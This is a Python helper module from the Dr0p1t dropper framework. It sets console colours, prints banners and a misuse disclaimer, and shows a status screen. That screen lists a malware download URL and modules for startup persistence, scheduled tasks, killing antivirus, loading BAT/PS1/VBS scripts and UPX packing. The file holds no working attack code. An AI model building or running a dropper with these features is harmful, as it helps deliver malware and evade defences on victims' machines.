#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
import sys
from os.path import *
global G, Y, B, R, W , M , C , end

def set_colors():
	global G, Y, B, R, W , M , C , end
	if sys.platform.startswith('win'):
		# Windows deserve coloring too :D
		try:
			import win_unicode_console , colorama
			win_unicode_console.enable()
			colorama.init()
			#Now the unicode will work ^_^
			G = '\033[92m'  # green
			Y = '\033[93m'  # yellow
			B = '\033[94m'  # blue
			R = '\033[91m'  # red
			W = '\033[0m'   # white
			M = '\x1b[35m'  # magenta
			C = '\x1b[36m'  # cyan
			end = '\33[97m'
		except:
			#print("[!] Error: Coloring libraries not installed ,no coloring will be used [Check the readme]")
			G = Y = B = R = W = G = Y = B = R = W = ''
	else:
		G = '\033[92m'  # green
		Y = '\033[93m'  # yellow
		B = '\033[94m'  # blue
		R = '\033[91m'  # red
		W = '\033[0m'   # white
		M = '\x1b[35m'  # magenta
		C = '\x1b[36m'  # cyan
		end = '\33[97m'

set_colors()
# Console Colors
def colored_print(text,color):
	global G, Y, B, R, W , M , C , end
	def cprint(text,color,end=end ):
		print(color+text+end)
	if color.lower()=="g":color=G
	elif color.lower()=="y":color=Y
	elif color.lower()=="b":color=B
	elif color.lower()=="r":color=R
	elif color.lower()=="w":color=W
	elif color.lower()=="m":color=M
	elif color.lower()=="c":color=C
	cprint( text, color, end )

def print_banner(banner,info,c1,c2):
	global G, Y, B, R, W , M , C , end
	def cprint(text,info,c1,c2):
		print(c1+text+end)
		print(c2+info+end)

	if c1.lower()=="g":color1=G
	elif c1.lower()=="y":color1=Y
	elif c1.lower()=="b":color1=B
	elif c1.lower()=="r":color1=R
	elif c1.lower()=="w":color1=W
	elif c1.lower()=="m":color1=M
	elif c1.lower()=="c":color1=C

	if c2.lower()=="g":color2=G
	elif c2.lower()=="y":color2=Y
	elif c2.lower()=="b":color2=B
	elif c2.lower()=="r":color2=R
	elif c2.lower()=="w":color2=W
	elif c2.lower()=="m":color2=M
	elif c2.lower()=="c":color2=C

	cprint( banner,info,color1,color2 )

def warn():
	global G, Y, B, R, W , M , C , end
	return '''{} # Disclaimer Alert #{}
  Dr0p1t Framework not responsible
    for misuse and for illegal purposes. {}
      Use it only for {}work{} or {} educational purpose {} !!!'''.format(R,B,Y,R,Y,R,W)

def print_status(args):
	global G, Y, B, R, W , M , C , end
	if args.s:
		c1,a = G," Loaded "
	else:
		c1,a = R,"Unloaded"

	if args.t:
		c2,b = G," Loaded "
	else:
		c2,b = R,"Unloaded"

	if args.k:
		c3,c = G," Loaded "
	else:
		c3,c = R,"Unloaded"

	if args.b:
		c4,d    = G," Loaded "
		cx1,bat = M,args.b
	else:
		c4,d = R,"Unloaded"
		cx1,bat = Y,"None"

	if args.p:
		c5,e = G," Loaded "
		cx2,ps1 = M,args.p
	else:
		c5,e = R,"Unloaded"
		cx2,ps1 = Y,"None"

	if args.v:
		c6,f = G," Loaded "
		cx3,vbs = M,args.v
	else:
		c6,f = R,"Unloaded"
		cx3,vbs = Y,"None"

	if args.upx:
		c7,g = G," Loaded "
	else:
		c7,g = R,"Unloaded"


	print("\n"+Y+"[+] "+W+"Malware url : "+B+"%s"%args.url+W+
	"\n"+Y+"\n[+] "+W+"Modules :"+
	"\n\tAdd to startup\t\t: "+c1+"[%s]"%a+W+
	"\n\tAdd to task\t\t: "+c2+"[%s]"%b+W+
	"\n\tKill antivirus\t\t: "+c3+"[%s]"%c+W+
	"\n\tLoad BAT file\t\t: "+c4+"[%s]"%d+W+
	"\n\tLoad PS1 file\t\t: "+c5+"[%s]"%e+W+
	"\n\tLoad VBS file\t\t: "+c6+"[%s]"%f+W+
	"\n\tCompress with UPX\t: "+c7+"[%s]"%g+W+

	"\n"+Y+"\n[+] "+W+"Loaded scripts :"+
	"\n\tBAT file : "+cx1+"%s"%bat+W+
	"\n\tPS1 file : "+cx2+"%s"%ps1+W+
	"\n\tVBS file : "+cx3+"%s"%vbs+W+"\n")
